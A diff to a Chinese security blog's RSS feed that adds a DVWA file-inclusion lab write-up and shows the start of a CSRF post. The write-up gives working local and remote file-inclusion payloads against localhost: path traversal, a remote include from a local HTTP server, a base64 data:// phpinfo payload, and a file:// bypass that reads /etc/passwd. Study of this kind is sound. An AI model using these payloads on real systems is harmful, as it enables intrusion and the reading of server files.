@@ -1,4 +1,189 @@
-<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/security/</link><description>Recent content in security on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Mon, 25 Apr 2022 16:33:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/security/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-CSRF</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</link><pubDate>Mon, 25 Apr 2022 16:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>security on weakptr's 笔记</title><link>https://nnnewb.github.io/blog/tags/security/</link><description>Recent content in security on weakptr's 笔记</description><generator>Hugo -- gohugo.io</generator><language>zh-cn</language><lastBuildDate>Tue, 26 Apr 2022 15:07:00 +0800</lastBuildDate><atom:link href="https://nnnewb.github.io/blog/tags/security/index.xml" rel="self" type="application/rss+xml"/><item><title>DVWA上手记录-文件包含</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</link><pubDate>Tue, 26 Apr 2022 15:07:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-04/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
+&lt;p>这次玩一下 DVWA 的文件包含。&lt;/p>
+&lt;h2 id="原理">原理&lt;/h2>
+&lt;h3 id="php和include">PHP和include&lt;/h3>
+&lt;p>在 php 语言中 &lt;code>include&lt;/code> 表达式用于包含指定的文件，写过 C/C++ 应该对 &lt;code>#include&lt;/code> 预处理指令比较熟，php 的 &lt;code>include&lt;/code> 表达式和 &lt;code>#include&lt;/code> 在某种程度上很相似，都是从指定的搜索路径里找到文件并“包含”进来。被包含的文件可以是 php 文件也可以是别的文件，这点和 &lt;code>#include&lt;/code> 预处理器比较像。&lt;/p>
+&lt;p>然后，因为 &lt;code>include&lt;/code> 可以写做表达式的缘故，在 php 里可以 &lt;code>include $file&lt;/code>，如果把用户传入的数据未经过检查就交给 &lt;code>include&lt;/code> 的话就可能产生一个文件包含漏洞。&lt;/p>
+&lt;blockquote>
+&lt;p>当一个文件被包含时，语法解析器在目标文件的开头脱离 PHP 模式并进入 HTML 模式，到文件结尾处恢复。由于此原因，目标文件中需要作为 PHP 代码执行的任何代码都必须被包括在&lt;a class="link" href="https://www.php.net/manual/zh/language.basic-syntax.phpmode.php" target="_blank" rel="noopener"
+>有效的 PHP 起始和结束标记&lt;/a>之中。&lt;/p>
+&lt;/blockquote>
+&lt;p>解释器的这个行为进一步拓宽了可利用的范围。&lt;/p>
+&lt;blockquote>
+&lt;p>如果“&lt;a class="link" href="https://www.php.net/manual/zh/filesystem.configuration.php#ini.allow-url-include" target="_blank" rel="noopener"
+>URL include wrappers&lt;/a>”在 PHP 中被激活，可以用 URL（通过 HTTP 或者其它支持的封装协议——见&lt;a class="link" href="https://www.php.net/manual/zh/wrappers.php" target="_blank" rel="noopener"
+>支持的协议和封装协议&lt;/a>）而不是本地文件来指定要被包含的文件。&lt;/p>
+&lt;/blockquote>
+&lt;p>对 &lt;code>include&lt;/code> 参数有足够控制的情况下，可以利用远程包含来执行任意代码。挑选合适的 url 协议可以 bypass 不够严谨的参数检查。&lt;/p>
+&lt;h3 id="本地文件包含">本地文件包含&lt;/h3>
+&lt;p>本地文件包含一般可以是 &lt;code>include &amp;quot;some/folder/&amp;quot; . $_GET[&amp;quot;file&amp;quot;] . &amp;quot;.php&amp;quot;&lt;/code> 或类似的形式，此时可以通过 &lt;code>file=../../malicious&lt;/code> 这样的 payload 来包含任意代码。&lt;/p>
+&lt;h3 id="远程文件包含">远程文件包含&lt;/h3>
+&lt;p>此时对 &lt;code>include&lt;/code> 参数有更强的控制，也可以通过 url 协议来远程包含 php 代码执行。或者 &lt;code>zlib://&lt;/code> 之类的协议直接把要执行的代码放在 payload 里。&lt;/p>
+&lt;h2 id="文件包含">文件包含&lt;/h2>
+&lt;h3 id="信息收集">信息收集&lt;/h3>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609.png"
+width="694"
+height="206"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140326609_hud5dae54c07875e5180ff93b4e02f6da3_14738_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426140326609"
+class="gallery-image"
+data-flex-grow="336"
+data-flex-basis="808px"
+>&lt;/p>
+&lt;p>页面没有什么特别的，点击上面的 &lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code> 能分别看到三个不同的子页面：&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312.png"
+width="681"
+height="289"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140433312_hua84d1dc3da761559efd8ad1a7c50fae8_16745_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426140433312"
+class="gallery-image"
+data-flex-grow="235"
+data-flex-basis="565px"
+>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863.png"
+width="686"
+height="294"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140441863_hu142f5a778f8ee05c5d21e37caed58cca_18677_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426140441863"
+class="gallery-image"
+data-flex-grow="233"
+data-flex-basis="560px"
+>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138.png"
+width="692"
+height="345"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140450138_hu06890191559f6ed8630cf8df1ca4af13_29940_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426140450138"
+class="gallery-image"
+data-flex-grow="200"
+data-flex-basis="481px"
+>&lt;/p>
+&lt;p>注意地址栏会发现有意思的地方：&lt;/p>
+&lt;ul>
+&lt;li>首页：http://localhost:8080/vulnerabilities/fi/?page=index.php&lt;/li>
+&lt;li>file1：http://localhost:8080/vulnerabilities/fi/?page=file1.php&lt;/li>
+&lt;li>file2：http://localhost:8080/vulnerabilities/fi/?page=file2.php&lt;/li>
+&lt;li>file3：http://localhost:8080/vulnerabilities/fi/?page=file3.php&lt;/li>
+&lt;/ul>
+&lt;p>很直接地想到 &lt;code>index.php&lt;/code>、&lt;code>file1.php&lt;/code>、&lt;code>file2.php&lt;/code>、&lt;code>file3.php&lt;/code>就是被包含的文件了。尝试提交一个 &lt;code>page=file4.php&lt;/code>，发现彩蛋。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383.png"
+width="675"
+height="158"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426140828383_hucb417c4362ff68ceb452ad74f62da85b_10343_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426140828383"
+class="gallery-image"
+data-flex-grow="427"
+data-flex-basis="1025px"
+>&lt;/p>
+&lt;p>直接观察 dvwa 源码，可以发现 &lt;code>include&lt;/code> 出现的位置是 &lt;code>dvwa/vulnerabilities/fi/index.php&lt;/code> 里，&lt;code>php.ini&lt;/code> 配置的 &lt;code>include_path&lt;/code> 应该是包含当前目录 &lt;code>.&lt;/code> 的，所以可以直接取相对路径包含任意文件。&lt;/p>
+&lt;p>差不多就是这样了。&lt;/p>
+&lt;h3 id="low难度">Low难度&lt;/h3>
+&lt;p>因为已经有一个 phpinfo 页面，我们先尝试包含一下。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540.png"
+width="1266"
+height="325"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426141056540_hu4a59d0a5d601ccfb5abd0b8fb32fe475_44301_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426141056540"
+class="gallery-image"
+data-flex-grow="389"
+data-flex-basis="934px"
+>&lt;/p>
+&lt;p>好的，直接成功。下一个问题是怎么 get shell。考虑服务在 docker 内，apache 的日志都链接到了 &lt;code>/dev/stdout&lt;/code> 和 &lt;code>/dev/stderr&lt;/code>，通过包含日志来执行代码是不行了。上传文件暂不考虑（因为还没开始做任意文件上传），故考虑下远程文件包含和利用url协议。&lt;/p>
+&lt;p>先试一下远程文件包含。&lt;code>python3 -m http.server&lt;/code>开个 http 服务器，下面放个 &lt;code>2.php&lt;/code>，然后构造 url：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=http://172.17.0.1:8000/2.php&lt;/code>&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274.png"
+width="1323"
+height="287"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426142642274_hu0265948fd10811eb90965c3f9bd2ea7e_40764_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426142642274"
+class="gallery-image"
+data-flex-grow="460"
+data-flex-basis="1106px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h3 id="提高难度medium">提高难度：Medium&lt;/h3>
+&lt;p>看看 Medium 难度下的代码。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;span class="c1">// The page we wish to display
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
+&lt;span class="c1">// Input validation
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;http://&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;https://&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nx">str_replace&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="k">array&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;../&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;..&lt;/span>&lt;span class="se">\\&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span> &lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">);&lt;/span>
+&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>用 &lt;code>str_replace&lt;/code> 替换掉了 &lt;code>../&lt;/code> 和 &lt;code>http://&lt;/code> 来解决目录穿越和 http 文件包含。但 php 支持的 url 协议显然不止这俩&amp;hellip;&lt;/p>
+&lt;p>改成&lt;code>data://&lt;/code>协议，重写一个 payload：&lt;code>http://localhost:8080/vulnerabilities/fi/?page=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOyA/Pgo=&lt;/code>。这段 base64 是 &lt;code> echo '&amp;lt;?php phpinfo(); ?&amp;gt;' | base64&lt;/code> 产生的。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441.png"
+width="1271"
+height="330"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143248441_hu344c582097d9047b6d453181f803144e_46632_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426143248441"
+class="gallery-image"
+data-flex-grow="385"
+data-flex-basis="924px"
+>&lt;/p>
+&lt;p>成功。&lt;/p>
+&lt;h3 id="提高难度high">提高难度：High&lt;/h3>
+&lt;p>High 难度下使用了 &lt;code>fnmatch&lt;/code> 匹配文件名，但模式是 &lt;code>file*&lt;/code>，所以还是有完蛋的可能。&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="o">&amp;lt;?&lt;/span>&lt;span class="nx">php&lt;/span>
+&lt;span class="c1">// The page we wish to display
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
+&lt;span class="c1">// Input validation
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="o">!&lt;/span>&lt;span class="nx">fnmatch&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="s2">&amp;#34;file*&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="c1">// This isn&amp;#39;t the page we want!
+&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;span class="cp">?&amp;gt;&lt;/span>&lt;span class="err">
+&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>先试一下能不能用&lt;code>file://&lt;/code>来 bypass 掉这个模式匹配。&lt;/p>
+&lt;p>&lt;img src="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394.png"
+width="1044"
+height="320"
+srcset="https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_480x0_resize_box_3.png 480w, https://nnnewb.github.io/blog/blog/p/get-start-dvwa-04/image-20220426143800394_hud36d0b89a12efda53b480f4975a9a556_46097_1024x0_resize_box_3.png 1024w"
+loading="lazy"
+alt="image-20220426143800394"
+class="gallery-image"
+data-flex-grow="326"
+data-flex-basis="783px"
+>&lt;/p>
+&lt;p>好的，成功 bypass 掉了这个模式，并且包含 &lt;code>/etc/passwd&lt;/code> 成功了。不过&lt;code>/etc/shadow&lt;/code>就没权限了。&lt;/p>
+&lt;p>后续利用需要一个值得被包含的文件，如果服务器上有 mysql 配置之类的文件而且能读的话包含也不错。如果有上传点的话可以尝试传个马再包含。&lt;/p>
+&lt;p>我太菜，虽然本地文件包含找出来了，想不到怎么用服务器上已有的文件去 get shell，日志包含又不可用。&lt;/p>
+&lt;h3 id="帮助文档">帮助文档&lt;/h3>
+&lt;p>差不多三个难度都解好了，接着看下帮助文档拓宽下思路。&lt;/p>
+&lt;blockquote>
+&lt;p>&lt;strong>Objective&lt;/strong>&lt;/p>
+&lt;p>Read all five famous quotes from &amp;lsquo;&lt;a class="link" href="http://localhost:8080/hackable/flags/fi.php" target="_blank" rel="noopener"
+>../hackable/flags/fi.php&lt;/a>&amp;rsquo; using only the file inclusion.&lt;/p>
+&lt;/blockquote>
+&lt;p>哦？目标是获取 &lt;code>hackable&lt;/code>下的 flag。稍改下 payload 很快就拿到了&lt;code>fi.php&lt;/code>的内容。&lt;/p>
+&lt;blockquote>
+&lt;p>1.) Bond. James Bond 2.) My name is Sherlock Holmes. It is my business to know what other people don&amp;rsquo;t know.&lt;/p>
+&lt;p>&amp;ndash;LINE HIDDEN ;)&amp;ndash;&lt;/p>
+&lt;p>4.) The pool on the roof must have a leak.&lt;/p>
+&lt;/blockquote>
+&lt;p>这个 &lt;code>LINE HIDDEN&lt;/code> 有点怪，不是说 &lt;code>five famous quotes&lt;/code> 吗，这只有4条。于是看了眼 &lt;code>fi.php&lt;/code>，发现是这样的=。=并不是没完全拿到flag。我寻思要完全拿到的话可以在 get shell 之后把 &lt;code>fi.php&lt;/code> 下载下来，不然单纯包含这个文件肯定是不行的。&lt;/p>
+&lt;p>impossible 难度代码长这样：&lt;/p>
+&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-php" data-lang="php">&lt;span class="c1">// The page we wish to display
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="nv">$file&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="nv">$_GET&lt;/span>&lt;span class="p">[&lt;/span> &lt;span class="s1">&amp;#39;page&amp;#39;&lt;/span> &lt;span class="p">];&lt;/span>
+&lt;span class="c1">// Only allow include.php or file{1..3}.php
+&lt;/span>&lt;span class="c1">&lt;/span>&lt;span class="k">if&lt;/span>&lt;span class="p">(&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;include.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file1.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file2.php&amp;#34;&lt;/span> &lt;span class="o">&amp;amp;&amp;amp;&lt;/span> &lt;span class="nv">$file&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="s2">&amp;#34;file3.php&amp;#34;&lt;/span> &lt;span class="p">)&lt;/span> &lt;span class="p">{&lt;/span>
+&lt;span class="c1">// This isn&amp;#39;t the page we want!
+&lt;/span>&lt;span class="c1">&lt;/span> &lt;span class="k">echo&lt;/span> &lt;span class="s2">&amp;#34;ERROR: File not found!&amp;#34;&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="k">exit&lt;/span>&lt;span class="p">;&lt;/span>
+&lt;span class="p">}&lt;/span>
+&lt;/code>&lt;/pre>&lt;/div>&lt;p>硬编码了所有可能的文件，如此一来就没有利用空间了。&lt;/p>
+&lt;h2 id="总结">总结&lt;/h2>
+&lt;p>文件包含这题感觉有点emmm&lt;/p>
+&lt;p>怎么说呢，DVWA的题好像都有点简单过头的样子=。=虽然我是这么想但感觉作为一个才开始接触安全方面，学习时间一星期不到的人来说说出这话有点不应该，膨胀了。&lt;/p>
+&lt;p>因为种种原因吧，感觉今年的自己特别焦躁。工资还只有这么点，事事不顺。一边劝自己知足，换工作不会改善现状，一边又焦虑自己一无所成。&lt;/p>
+&lt;p>烦心。&lt;/p></description></item><item><title>DVWA上手记录-CSRF</title><link>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</link><pubDate>Mon, 25 Apr 2022 16:33:00 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/get-start-dvwa-03/</guid><description>&lt;h2 id="前言">前言&lt;/h2>
 &lt;p>这次看下 DVWA 的 CSRF 题。&lt;/p>
 &lt;p>昨天忙完了工作，闲下来的时间顺便看了下 DVWA 的部署。在我的 fork 分支里添加了 docker 支持。因为是纯新增，不太可能有 breaking change，直接在 GitHub 网页点点鼠标就能同步上游代码。这样就能用上最新的 DVWA 同时享受 docker 一键启动 DVWA 环境的快乐了。&lt;/p>
 &lt;p>用法很简单：&lt;/p>
